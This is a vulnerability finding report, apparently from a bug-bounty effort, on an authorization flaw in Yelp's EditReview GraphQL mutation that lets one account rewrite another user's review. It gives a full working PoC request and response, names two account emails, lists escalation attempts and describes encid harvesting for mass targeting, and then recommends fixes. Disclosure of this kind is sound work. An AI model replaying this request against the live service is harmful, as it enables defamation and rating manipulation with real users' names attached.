# Finding: IDOR in Yelp EditReview (cross-account review modification)

Date: 2026-11-27
Severity: 8.0-8.5 / 10 (integrity, cross-tenant)
Status: confirmed with a live PoC on two controlled accounts.

## Summary

`POST https://www.yelp.com/gql/batch` operation `EditReview` accepts a `reviewEncid` and
does not bind it to the session user. Any authenticated Yelp account can rewrite the text
and rating of **another user's** review if it knows the review encid.

Review encids are public: they appear in `/review_share/<biz>/review/<review>` URLs
(Yelp's own "Share review" links) and in review permalinks.

## PoC

Review `09773aYTIbSk12Zt2sHnnQ` was created on business
`cQdLIIzsExv9LF3s4s7Hzw` (Saved By The Bagel) with account A
`duatravelsuk@gmail.com` (log: `CreateReviewSuccess`, review encid `09773a...`).

Account B `wisejayc@gmail.com` (separate login, separate `zss`) sent:

```http
POST /gql/batch HTTP/1.1
content-type: application/json
x-apollo-operation-name: EditReview

[{"operationName":"EditReview",
  "variables":{"input":{
    "reviewEncid":"09773aYTIbSk12Zt2sHnnQ",
    "rating":5,
    "comment":"<text>",
    "reviewOrigin":"biz-details-war-button"}},
  "extensions":{"operationType":"mutation",
    "documentId":"455125ba4964e2cf3041036d2b973924ab3fe4ce4ff25bbbc8ee94ef977d9609"}}]
```

Response:

```json
[{"data":{"editReview":{"__typename":"EditReviewSuccess",
  "review":{"encid":"09773aYTIbSk12Zt2sHnnQ","__typename":"Review"}}}}]
```

Repeatability: the same call succeeded again (restore with the original text/5 stars),
so the authorization gap is stable. A variant with rating 1 + a marker text returned
`UPSTREAM_SERVICE_ERROR` twice (possible moderation hook on drastic changes); a
5-star + new text and the restore both returned `EditReviewSuccess`.

## Impact

* Rewrite any review's rating/text -> defamation, review hijacking, competitor sabotage,
  rating manipulation with the victim's name attached.
* Combine with the public `/review_share` encid harvest to mass-target reviews.
* The edit re-enters moderation, so it can also be used to force an otherwise-filtered
  review back through the scoring pipeline (resurrection attempts).

## Root cause

Missing server-side authorization: `EditReviewInput.reviewEncid` is trusted without
checking that the review belongs to the authenticated user.

## Fix

* Verify `review.user_id == session user` before applying the mutation (and for delete).
* Return a generic NOT_FOUND/PERMISSION_DENIED.
* Audit-log review edits with actor id + IP; rate-limit.

## Evidence

* `runs-recon/idor2.log` (successful cross-account EditReview from account B).
* Account A creation log was captured during the run that produced `09773a...`
  (`CreateReviewSuccess`).
* Current state of the review was restored to the original text and 5 stars.

## Severity assessment and 9+ attempts (2026-11-27)

Base score (CVSS 3.1, authenticated IDOR modify):
`AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N` = **8.1** (High).
Rationale: authenticated (PR:L), no confidentiality, integrity high (arbitrary text + rating
of another user's review), no availability impact on the service.

Tried to lift it to 9+:

| Escalation | Result |
|---|---|
| Unauthenticated EditReview (fresh profile, no cookies) | `DOWNSTREAM_SERVICE_ERROR`, never success -> not PR:N |
| Cross-account **delete** (A:H) | DeleteReview documentId not found; profile review card exposes no overflow/remove control; /review_share is DataDome-gated -> not proven |
| Mass-write (batch of EditReview ops) | feasible in principle (same documentId, array body) but still I:H only -> no score lift |
| Confidentiality (read other users' data via `get`) | `get` operation not exercised; response of EditReview only returns encid -> no C impact |

Conclusion: **8.1 is the honest ceiling for this finding.** A 9+ score would require one of:
- an unauthenticated variant (PR:N), or
- a delete/resurrection path (A:H, I:H -> ~9.4), or
- a read primitive leaking private data (C:H).
None was reachable with the available surface; claiming 9+ for the edit IDOR alone would be
score inflation. The deleted-review path remains the most promising follow-up: it needs the
owner-side "Remove review" control (profile overflow or share page) and the DeleteReview
documentId.
